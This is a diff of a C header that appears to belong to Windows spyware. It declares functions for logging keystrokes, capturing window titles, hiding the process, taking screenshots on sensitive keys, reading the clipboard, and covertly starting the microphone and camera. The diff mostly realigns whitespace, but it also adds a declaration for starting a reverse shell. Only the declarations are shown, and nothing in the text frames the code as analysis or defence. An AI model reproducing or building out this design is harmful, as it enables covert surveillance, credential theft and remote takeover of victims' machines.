@@ -33,21 +33,23 @@ extern volatile int g_micro_run;
 }
 #endif
 
-int vk_to_char(DWORD vkCode, char *out);
-void get_time(char *buf);
-char *special_touch(DWORD vk);
-void get_window_title(char *title);
+int     vk_to_char(DWORD vkCode, char *out);
+void    get_time(char *buf);
+char    *special_touch(DWORD vk);
+void    get_window_title(char *title);
 
-void hide_process(wchar_t *new_name);
-int capture_screen(LPCWSTR path);
-void on_special_event(void);
-void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
-int allow_app(char *exe, DWORD pid);
-void read_clipboard(char *buffer, size_t size);
-int is_sensitive_key(DWORD vk);
+void    hide_process(wchar_t *new_name);
+int     capture_screen(LPCWSTR path);
+void    on_special_event(void);
+void    screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
+int     allow_app(char *exe, DWORD pid);
+void    read_clipboard(char *buffer, size_t size);
+int     is_sensitive_key(DWORD vk);
 
-int capture_micro(void);
-int start_camera(void);
+int     capture_micro(void);
+int     start_camera(void);
+
+void    start_reverse_shell(void);
 
 
 #endif
